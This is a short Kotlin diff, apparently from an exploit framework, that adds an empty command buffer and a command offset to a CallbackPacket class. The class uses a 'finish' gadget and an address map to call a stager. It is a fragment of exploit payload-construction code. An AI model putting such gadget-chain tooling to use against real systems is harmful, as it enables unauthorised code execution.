@@ -18,6 +18,10 @@ data class CallbackPacket(
 		"token" to getFinishToken(profile.addressMap.stager),
 	)
 
+	// put empty command data right after the actual packet
+	override fun getCommand() = byteArrayOf()
+	override fun getCommandOffset() = 0x88
+
 	// use the "finish" gadget to call the stager without doing anything
 	override val target = profile.getGadget("finish")
 }
